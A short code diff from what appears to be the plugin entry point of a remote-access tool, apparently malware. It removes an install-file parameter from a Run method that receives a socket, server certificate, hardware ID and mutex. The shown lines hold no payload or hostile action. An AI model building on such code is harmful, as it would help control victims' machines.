@@ -20,14 +20,13 @@ namespace Plugin
         public static string Install;
         public static string InstallFile;
 
-        public void Run(Socket socket, X509Certificate2 certificate, string hwid, byte[] msgPack, Mutex mutex, string mtx, string bdos, string install, string installFile)
+        public void Run(Socket socket, X509Certificate2 certificate, string hwid, byte[] msgPack, Mutex mutex, string mtx, string bdos, string install)
         {
             Debug.WriteLine("Plugin Invoked");
             AppMutex = mutex;
             Mutex = mtx;
             BDOS = bdos;
             Install = install;
-            InstallFile = installFile;
             Socket = socket;
             Connection.ServerCertificate = certificate;
             Connection.Hwid = hwid;
